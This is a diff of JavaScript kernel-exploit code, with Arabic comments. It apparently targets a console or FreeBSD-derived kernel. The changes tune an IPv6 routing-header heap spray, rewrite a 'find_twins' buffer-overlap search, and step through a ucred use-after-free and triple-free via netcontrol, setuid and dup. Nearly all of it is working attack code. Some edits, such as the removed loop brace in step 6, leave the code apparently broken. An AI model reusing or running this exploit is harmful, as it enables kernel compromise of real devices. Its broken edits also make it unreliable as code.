@@ -114,9 +114,9 @@ var UIO_IOV_NUM = 0x14; // 20
 var MSG_IOV_NUM = 0x17; // 23
 
 // Params for kext stability
-var IPV6_SOCK_NUM = 96;
-var IOV_THREAD_NUM = 8;
-var UIO_THREAD_NUM = 8;
+var IPV6_SOCK_NUM  = 64;
+var IOV_THREAD_NUM = 4;
+var UIO_THREAD_NUM = 4;
 var MAIN_LOOP_ITERATIONS = 5;
 var TRIPLEFREE_ITERATIONS = 5;
 var MAX_ROUNDS_TWIN = 10;
@@ -197,6 +197,7 @@ var kl_lock;
 var tmp = malloc(PAGE_SIZE);
 var saved_fpu_ctrl = 0;
 var saved_mxcsr = 0;
+
 function build_rthdr(buf, size) {
   var len = (size >> 3) - 1 & ~1;
   var actual_size = (len + 1) << 3;
@@ -269,51 +270,46 @@ get_sockopt = function(sd, level, optname, optval, optlen) {
   return out_len;
 };
 
-// 1) احفظ الدالة الأصلية
-var real_set_rthdr = set_rthdr;
+// 1) نفس فكرة rthdr_spray في Lua
+var rthdr_spray = malloc(UCRED_SIZE);
+fill_buffer_64(rthdr_spray, new BigInt(0), UCRED_SIZE);
 
-// 2) اعمل wrapper فوقها
-set_rthdr = function(sock, buf, len) {
-  //log("[RTHDR] BEFORE sock=" + sock + " len=" + len);
+var rthdr_spray_len = build_rthdr(rthdr_spray, UCRED_SIZE);
 
-  var ret = real_set_rthdr(sock, buf, len);
+// هنا بالضبط تحط اللوجات
+log("[HDR] nxt=" + read8(rthdr_spray));
+log("[HDR] len=" + read8(rthdr_spray.add(1)));
+log("[HDR] type=" + read8(rthdr_spray.add(2)));
+log("[HDR] segleft=" + read8(rthdr_spray.add(3)));
 
-  //log("[RTHDR] AFTER ret=" + ret);
+// 2) نفس فكرة tag_buf و tag_len
+var tag_buf = malloc(0x10);
+var tag_len = malloc(4);
 
-  return ret;
-};
-function set_rthdr(sd, buf, len) {
+// 3) set_rthdr / get_rthdr زي ما اتفقنا قبل كده
+function _set_rthdr_raw(sd, buf, len) {
   return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
-  // debug("set_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
-  // debug("Called with buf: " + hex(read64(buf)) + " len: " + hex(len));
-  // return ret;
+}
+function set_rthdr(sd, buf, len) {
+  return _set_rthdr_raw(sd, buf, len);
 }
 
-var real_get_rthdr = get_rthdr;
-
-get_rthdr = function(sock, buf, len) {
-  //log("[RTHDR-GET] BEFORE sock=" + sock + " max_len=" + len);
-  var ret = real_get_rthdr(sock, buf, len);
-  //log("[RTHDR-GET] AFTER ret=" + ret);
-  return ret;
-};
-function get_rthdr(sd, buf, max_len) {
-  return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
-  // debug("get_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
-  // debug("Result buf: " + hex(read64(buf)) + " max_len: " + hex(max_len));
-  // return ret;
+function _get_rthdr_raw(sd, buf, max_len_ptr_or_val) {
+  return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len_ptr_or_val);
 }
+function get_rthdr(sd, buf, max_len_ptr_or_val) {
+  return _get_rthdr_raw(sd, buf, max_len_ptr_or_val);
+}
+function free_rthdr(sd) {
+  set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0);
+}
+
 function free_rthdrs(sds) {
   for (var sd of sds) {
     if (!sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
-      //log("[RTHDR-FREE-ALL] sd=" + sd);
       set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0);
     }
   }
-}
-function free_rthdr(sd) {
-  //log("[RTHDR-FREE] sd=" + sd);
-  set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0);
 }
 function pin_to_core(core) {
   write32(cpu_mask_buf, 1 << core);
@@ -818,141 +814,76 @@ function cleanup() {
   log('Cleanup completed');
 }
 function fill_buffer_64(buf, val, len) {
-  if (!buf || buf.eq(0) || len <= 0) {
-    //log("[BUF-FILL] SKIP buf=" + buf + " len=" + len);
+  // Basic validation
+  if (!buf || buf.eq(0)) {
+    throw new Error("fill_buffer_64: null buffer");
+  }
+
+  if (len <= 0) {
     return;
   }
 
-  //log("[BUF-FILL] START buf=" + buf + " len=" + len + " val=" + val);
+  // Ensure 8-byte alignment
+  if ((len & 7) !== 0) {
+    throw new Error("fill_buffer_64: len must be multiple of 8");
+  }
 
+  // Optional: ensure buf itself is aligned
+  if ((buf.low & 7) !== 0) {
+    throw new Error("fill_buffer_64: buffer not 8-byte aligned");
+  }
+
+  // Fill
   for (var i = 0; i < len; i += 8) {
     write64(buf.add(i), val);
   }
-
-  //log("[BUF-FILL] END wrote=" + len + " bytes");
-  //log("[BUF-FILL] wrote @ offset " + i);
-
 }
-var real_find_twins = find_twins;
-
-find_twins = function () {
-  log("[TWINS] START");
-
-  var result = real_find_twins();
-
-  if (result) {
-    //log("[TWINS] RESULT = FOUND i=" + twins[0] + " j=" + twins[1]);
-  } else {
-    log("[TWINS] RESULT = NOT FOUND");
-  }
-
-  return result;
-};
-
-
-function dumpBuf(ptr, size, label) {
-  var out = label + " @ " + hex(ptr) + " (size=" + size + "): ";
-  for (var k = 0; k < size; k += 4) {
-    out += hex(read32(ptr.add(k))) + " ";
-  }
-  log(out);
-}
-
-function find_twins() {
-
-  var count = 0;
-  var val, i, j;
-  var zeroMemoryCount = 0;
-
+function _find_twins_raw() {
   twins[0] = -1;
   twins[1] = -1;
 
-  var spray_add = spray_rthdr.add(0x04);
-  var leak_add  = leak_rthdr.add(0x04);
+  var count = 0;
+  var val, i, j;
 
   while (count < MAX_ROUNDS_TWIN) {
 
-    //log("\n[TWINS-ROUND] #" + count + "\n");
-
-    // memory pressure check (soft)
-    if (typeof debugging !== 'undefined' &&
-        debugging.info &&
-        debugging.info.memory &&
-        debugging.info.memory.available === 0) {
-
-      zeroMemoryCount++;
-      if (zeroMemoryCount >= 5) {
-        log("[TWINS] MEMORY LIMIT REACHED (soft abort)");
-        return false;
-      }
-    } else {
-      zeroMemoryCount = 0;
-    }
-
     // WRITE PHASE
     for (i = 0; i < ipv6_socks.length; i++) {
-
-      if (ipv6_socks[i].eq(BigInt_Error))
-        continue;
+      if (ipv6_socks[i].eq(BigInt_Error)) continue;
 
       var tag = RTHDR_TAG | i;
+      write32(rthdr_spray.add(4), tag);
 
-      // لوج قديم لو حابب تسيبه أو تقلله
-     // log("[WRITE] sock=" + i + " tag=" + hex(tag));
+      log("[WRITE] sock=" + i + " tag_written=" + hex(tag));
 
-      // كتابة التاج في البافر المشترك
-      write32(spray_add, tag);
-      read32(spray_add);
-
-      // 🔥 اللوج الجديد + استدعاء set_rthdr الحقيقي
-      var spray_ptr = spray_rthdr_rop.add(i * UCRED_SIZE);
-
-      //log("[WRITE] sock=" + i + " spray_ptr=" + hex(spray_ptr) + " len=" + spray_rthdr_len);
-
-      set_rthdr(
-        ipv6_socks[i],
-        spray_ptr,
-        spray_rthdr_len
-      );
+      set_rthdr(ipv6_socks[i], rthdr_spray, rthdr_spray_len);
     }
 
     // READ PHASE
     for (i = 0; i < ipv6_socks.length; i++) {
+      if (ipv6_socks[i].eq(BigInt_Error)) continue;
 
-      if (ipv6_socks[i].eq(BigInt_Error))
-        continue;
+      if (get_rthdr(ipv6_socks[i], tag_buf, 8) >= 0) {
 
-      write32(leak_add, 0);
+        val = read32(tag_buf.add(4));
+        j = val & 0xFFFF;
 
-      // قراءة 0x20 بايت بدل 8
-      get_rthdr(ipv6_socks[i], leak_rthdr, 0x20);
+        log("[READ] sock=" + i + 
+            " val=" + hex(val) + 
+            " j=" + j);
 
-      // لوج إضافي: dump أول 0x20 بايت
-      var dump = "";
-      for (var k = 0; k < 0x20; k += 4) {
-        dump += hex(read32(leak_rthdr.add(k))) + " ";
-      }
-      //log("[DUMP] sock=" + i + " → " + dump);
+        var condition =
+          ((val & 0xFFFF0000) === RTHDR_TAG) &&
+          (i !== j) &&
+          (j >= 0) &&
+          (j < ipv6_socks.length);
 
-      // تحليل التاج
-      val = read32(leak_add);
-      j = val & 0xFFFF;
-
-      //log("[PARSE] raw_val=" + hex(val) + " tag=" + hex(val & 0xFFFF0000) + " idx=" + j);
-
-      var condition =
-        ((val & 0xFFFF0000) === RTHDR_TAG) &&
-        (i !== j) &&
-        (j >= 0) &&
-        (j < ipv6_socks.length);
-
-      //log("[CHECK] i=" + i + " j=" + j + " cond=" + condition);
-
-      if (condition) {
-        log("\n🔥🔥🔥 [TWINS-FOUND] i=" + i + " j=" + j + " 🔥🔥🔥\n");
-        twins[0] = i;
-        twins[1] = j;
-        return true;
+        if (condition) {
+          log("[TWINS] FOUND i=" + i + " j=" + j);
+          twins[0] = i;
+          twins[1] = j;
+          return true;
+        }
       }
     }
 
@@ -960,6 +891,19 @@ function find_twins() {
   }
 
   return false;
+}
+function find_twins() {
+  log("[TWINS] START");
+
+  var result = _find_twins_raw();
+
+  if (result) {
+    log("[TWINS] FOUND → i=" + twins[0] + " j=" + twins[1]);
+  } else {
+    log("[TWINS] NOT FOUND");
+  }
+
+  return result;
 }
 function find_triplet(master, other, iterations) {
   if (typeof iterations === 'undefined') iterations = MAX_ROUNDS_TRIPLET;
@@ -1435,45 +1379,33 @@ function trigger_ucred_triplefree() {
     //log("[TRIGGER] loop start main_count=" + main_count);
 
     // 1) dummy socket → register in netcontrol
-    send_notification("step 1: start");
     var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    send_notification("step 1: dummy_socket = " + dummy_socket);
 
     var sock_buf = malloc(8);
     write32(sock_buf, dummy_socket);
-    send_notification("step 1: sock_buf[0..3] = " + read32(sock_buf));
 
     netcontrol(-1, NET_CONTROL_NETEVENT_SET_QUEUE, sock_buf, 8);
-    send_notification("step 1: after netcontrol SET_QUEUE");
 
     close(dummy_socket);
-    send_notification("step 1: done (dummy_socket closed)");
 
 
     // 2) allocate new ucred
     setuid(1);
-    send_notification("step 2: (setuid(1) alloc new ucred) done");
 
 
     // 3) reclaim fd → uaf_socket
-    send_notification("step 3: start (reclaim fd → uaf_socket)");
     uaf_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    send_notification("step 3: uaf_socket = " + uaf_socket );
 
 
     // 4) free previous ucred
     setuid(1);
-    send_notification("step 4: (setuid(1) free previous ucred) done");
 
 
     // 5) unregister → free file + ucred
-    send_notification("step 5: start (unregister → free file + ucred)");
     var ctrl_buf = malloc(8);
     write32(ctrl_buf, uaf_socket);
-    send_notification("step 5: ctrl_buf[0..3] = " + read32(ctrl_buf));
 
     netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, ctrl_buf, 8);
-    send_notification("step 5: (after netcontrol CLEAR_QUEUE)  done");
 
 
     // 6) محاولة إصلاح refcount بشكل خفيف
@@ -1482,32 +1414,15 @@ function trigger_ucred_triplefree() {
     );
 
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
-      send_notification("step 6: loop i=" + i + " BEFORE trigger_iov_recvmsg");
-      trigger_iov_recvmsg();
-
       var w = write(new BigInt(iov_sock_1), tmp, 1);
-      send_notification(
-        "step 6: loop i=" + i +
-        " AFTER write: fd=" + iov_sock_1 +
-        ", write_ret=" + w
-      );
 
       wait_iov_recvmsg();
-      send_notification("step 6: loop i=" + i + " AFTER wait_iov_recvmsg");
-
       var r = read(new BigInt(iov_sock_0), tmp, 1);
       // لو عندك read8(tmp) أو ما شابه تقدر تستخدمه هنا
-      send_notification(
-        "step 6: loop i=" + i +
-        " AFTER read: fd=" + iov_sock_0 +
-        ", read_ret=" + r
-      );
-    }
-    
+ 
     send_notification("step 6: done");
 
     // 7) double free أول مرة
-    send_notification("step 7: first double-free via dup(uaf_socket) - start");
     var dup_fd = dup(uaf_socket);
     if (dup_fd > -1) {
         close(dup_fd);
@@ -1517,23 +1432,24 @@ function trigger_ucred_triplefree() {
     // 8) إيجاد التوأم
     log("[TRIGGER] step 8: find_twins()");
     end = find_twins();
-    log("[TRIGGER] step 8: find_twins() result end=" + end);
+    send_notification("[TRIGGER] step 8: find_twins() result end=" + end);
 
     if (!end) {
-      log("[TRIGGER] step 8: no twins, cleanup & retry");
+      send_notification("[TRIGGER] step 8: no twins, cleanup & retry");
       twins[0] = -1;
       twins[1] = -1;
       close(new BigInt(uaf_socket));
       continue;
     }
-
+    send_notification("step 8: done");
     log("[TRIGGER] step 8: twins found twins[0]=" + twins[0] + " twins[1]=" + twins[1]);
 
     // 9) free واحدة من التوأم
     //log("[TRIGGER] step 9: free_rthdr on twins[1] sock=" + ipv6_socks[twins[1]]);
     free_rthdr(ipv6_socks[twins[1]]);
     //log("[TRIGGER] step 9 done");
-
+    send_notification("step 9: done"); 
+    
     // 10) انتظار refcount = 1 مع ترتيب ثابت لدورة iov
     //log("[TRIGGER] step 10: wait refcount==1, max_wait=" + TRIPLEFREE_REFCOUNT_MAX_WAIT);
     var count = 0;
@@ -1569,11 +1485,14 @@ function trigger_ucred_triplefree() {
 
     triplets[0] = twins[0];
     //log("[TRIGGER] step 10: refcount==1, triplets[0]=" + triplets[0]);
+    send_notification("step 10: done");
+
 
     // 11) triple free فعليًا
     //log("[TRIGGER] step 11: triple-free via dup(uaf_socket)");
     close(dup(new BigInt(uaf_socket)));
     //log("[TRIGGER] step 11 done");
+    send_notification("step 11: done");
 
     // 12) إيجاد triplet 1
     //log("[TRIGGER] step 12: find_triplet #1 from " + triplets[0]);
